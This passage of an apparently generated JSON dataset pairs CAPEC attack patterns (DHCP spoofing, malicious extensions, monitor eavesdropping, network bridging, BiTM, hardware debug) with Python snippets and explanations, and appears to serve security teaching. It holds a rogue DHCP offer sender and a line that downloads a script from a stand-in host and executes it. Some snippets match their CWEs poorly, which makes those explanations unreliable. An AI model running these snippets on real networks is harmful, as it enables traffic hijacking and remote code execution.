        "code_snippet": "import socket\n\n# Simulate a malicious DHCP server\nclass MaliciousDHCPServer:\n    def __init__(self, ip, port):\n        self.ip = ip\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind((self.ip, self.port))\n\n    def send_dhcp_offer(self, target_ip, target_mac):\n        # Craft a fake DHCP offer packet\n        dhcp_offer = b'\\x02' + b'\\x01' + b'\\x06' + b'\\x00'  # Message type, hardware type, hardware length, hops\n        dhcp_offer += b'\\x00' * 4  # Transaction ID\n        dhcp_offer += b'\\x00' * 2  # Seconds elapsed\n        dhcp_offer += b'\\x00' * 2  # Bootp flags\n        dhcp_offer += socket.inet_aton(target_ip)  # Client IP address\n        dhcp_offer += socket.inet_aton(self.ip)  # Your (server) IP address\n        dhcp_offer += socket.inet_aton('0.0.0.0')  # Next server IP address\n        dhcp_offer += socket.inet_aton('0.0.0.0')  # Relay agent IP address\n        dhcp_offer += target_mac  # Client MAC address\n        dhcp_offer += b'\\x00' * 10  # Client hardware address padding\n        dhcp_offer += b'\\x00' * 64  # Server host name\n        dhcp_offer += b'\\x00' * 128  # Boot file name\n        dhcp_offer += b'\\x63\\x82\\x53\\x63'  # Magic cookie\n        dhcp_offer += b'\\x35\\x01\\x02'  # Option: DHCP Message Type (Offer)\n        dhcp_offer += b'\\xff'  # End Option\n\n        # Send the fake DHCP offer to the target\n        self.sock.sendto(dhcp_offer, ('<broadcast>', 68))\n\n# Example usage\nmalicious_server = MaliciousDHCPServer('192.168.1.1', 67)\nmalicious_server.send_dhcp_offer('192.168.1.100', b'\\x00\\x0c\\x29\\x3e\\x1c\\x2b')",
        "description": "This Python code snippet demonstrates a basic implementation of a malicious DHCP server that sends a fake DHCP offer to a target machine. The `MaliciousDHCPServer` class initializes a UDP socket bound to a specified IP and port. The `send_dhcp_offer` method crafts a fake DHCP offer packet and sends it to the target IP and MAC address. This code embodies the main idea of DHCP Spoofing (CAPEC) by simulating an adversary masquerading as a legitimate DHCP server. The related CWEs are represented in the context of improper endpoint communication, authentication bypass, and reliance on IP addresses for authentication."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_extension.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-426: Untrusted Search Path\nextension_path = '/tmp/malicious_extension.py'\nwith open(extension_path, 'wb') as file:\n    file.write(response.content)\n\n# CWE-507: Trojan Horse\n# CWE-506: Embedded Malicious Code\n# Execute the downloaded extension\nos.system(f'python {extension_path}')",
        "description": "This Python code snippet demonstrates the concept of 'Install Malicious Extension' by downloading and executing a potentially malicious Python script from an untrusted source. The code does not perform any integrity checks on the downloaded content (CWE-494), includes functionality from an untrusted control sphere (CWE-829), and uses an untrusted search path (CWE-426). The downloaded script could contain hidden malicious code (CWE-507, CWE-506) that violates the intended security policy."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import socket\n\n# Simulate cleartext transmission of sensitive information\nsensitive_data = 'UserPassword123'\n\n# Create a socket object\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Define the server address and port\nserver_address = ('localhost', 10000)\n\n# Connect to the server\ns.connect(server_address)\n\ntry:\n    # Send data in cleartext\n    s.sendall(sensitive_data.encode('utf-8'))\nfinally:\n    # Close the connection\n    s.close()\n\n# Simulate improper protection of physical side channels\n# This is a placeholder for the actual physical side channel vulnerability\n# In a real scenario, this would involve capturing electromagnetic emissions\n# or other side-channel data from the monitor or cable\n\ndef capture_side_channel_data():\n    # Placeholder function to represent side-channel data capture\n    print('Capturing side-channel data...')\n\ncapture_side_channel_data()",
        "description": "This Python code snippet demonstrates a scenario where sensitive information is transmitted in cleartext over a network, which can be intercepted by unauthorized actors (CWE-319). Additionally, it includes a placeholder function to represent the capture of side-channel data, such as electromagnetic emissions from a monitor or cable (CWE-1300). The code highlights the vulnerability described in the CAPEC by showing how an attacker could eavesdrop on sensitive information without modifying any cables or installing software, thus impacting the confidentiality of the data."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "import socket\n\nclass NetworkBridge:\n    def __init__(self, trusted_ip, untrusted_ip, port):\n        self.trusted_ip = trusted_ip\n        self.untrusted_ip = untrusted_ip\n        self.port = port\n        self.trusted_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.untrusted_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def bridge(self):\n        try:\n            self.trusted_socket.connect((self.trusted_ip, self.port))\n            self.untrusted_socket.connect((self.untrusted_ip, self.port))\n            while True:\n                data = self.trusted_socket.recv(1024)\n                if not data:\n                    break\n                self.untrusted_socket.sendall(data)\n        except Exception as e:\n            print(f\"Error: {e}\")\n        finally:\n            self.trusted_socket.close()\n            self.untrusted_socket.close()\n\n# Example usage\nbridge = NetworkBridge('192.168.1.10', '10.0.0.10', 8080)\nbridge.bridge()",
        "description": "This Python code snippet demonstrates a simple network bridge that connects a trusted network (192.168.1.10) with an untrusted network (10.0.0.10) over a specified port (8080). The `NetworkBridge` class initializes sockets for both the trusted and untrusted networks and attempts to bridge data between them. The `bridge` method continuously reads data from the trusted network and sends it to the untrusted network without proper validation or security checks. This embodies the main idea of the CAPEC 'Network Boundary Bridging' by showing how an adversary could misuse elevated access to create a channel between trusted and untrusted networks. The code also highlights related CWEs such as improper restriction of communication channels, trust boundary violations, and inadequate access control."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "import socket\nimport threading\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-830: Inclusion of Web Functionality from an Untrusted Source\n\n# Simulate a simple web server that includes a remote desktop session from an untrusted source\nclass VulnerableWebServer:\n    def __init__(self, host='0.0.0.0', port=8080):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(5)\n        print(f'Server listening on {self.host}:{self.port}')\n\n    def handle_client(self, client_socket):\n        # CWE-830: Including remote desktop functionality from an untrusted source\n        remote_desktop_html = '''\n        <html>\n        <body>\n        <iframe src=\"http://untrusted-source.com/remote-desktop\" width=\"100%\" height=\"100%\"></iframe>\n        </body>\n        </html>\n        '''\n        client_socket.sendall(b'HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n')\n        client_socket.sendall(remote_desktop_html.encode('utf-8'))\n        client_socket.close()\n\n    def start(self):\n        while True:\n            client_socket, addr = self.server_socket.accept()\n            print(f'Accepted connection from {addr}')\n            client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))\n            client_handler.start()\n\nif __name__ == '__main__':\n    server = VulnerableWebServer()\n    server.start()",
        "description": "This Python code snippet represents a vulnerable web server that includes remote desktop functionality from an untrusted source, embodying the main idea of the CAPEC 'Browser in the Middle (BiTM)'. The server listens for incoming connections and serves an HTML page that embeds an iframe pointing to a remote desktop session hosted on an untrusted domain. This setup can lead to several security issues:\n\n1. **CWE-294: Authentication Bypass by Capture-replay** - The server does not implement any authentication mechanism, making it susceptible to replay attacks if any authentication were added without proper protection.\n2. **CWE-345: Insufficient Verification of Data Authenticity** - The server does not verify the authenticity of the remote desktop content, potentially allowing malicious content to be served.\n3. **CWE-602: Client-Side Enforcement of Server-Side Security** - The server relies on the client to enforce any security measures, which is inherently insecure.\n4. **CWE-830: Inclusion of Web Functionality from an Untrusted Source** - The server includes web functionality from an untrusted source, which can lead to the untrusted source gaining control over the server's domain and potentially executing malicious actions."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "class DebugComponent:\n    def __init__(self, authorized=False):\n        self.authorized = authorized\n        self.debug_functions = ['read_register', 'write_register', 'inject_error']\n\n    def access_debug_function(self, function_name):\n        if function_name in self.debug_functions:\n            if self.authorized:\n                return f'Accessing {function_name}'\n            else:\n                return 'Unauthorized access attempt detected'\n        else:\n            return 'Invalid debug function'\n\n# Example usage\n# Unauthorized access to debug function\nunauthorized_debug = DebugComponent(authorized=False)\nprint(unauthorized_debug.access_debug_function('read_register'))\n\n# Authorized access to debug function\nauthorized_debug = DebugComponent(authorized=True)\nprint(authorized_debug.access_debug_function('write_register'))",
        "description": "This Python code snippet defines a `DebugComponent` class that simulates access control for hardware debug functions. The class has an `authorized` attribute to determine if the user is authorized to access debug functions. The `access_debug_function` method checks if the requested debug function is valid and if the user is authorized to access it. If the user is not authorized, it returns an 'Unauthorized access attempt detected' message. This snippet embodies the main idea of the CAPEC by demonstrating how incorrect chaining or granularity of debug components can lead to unauthorized access if proper access control is not implemented. The related CWEs are represented by the debug functions and the access control mechanism."
    }
]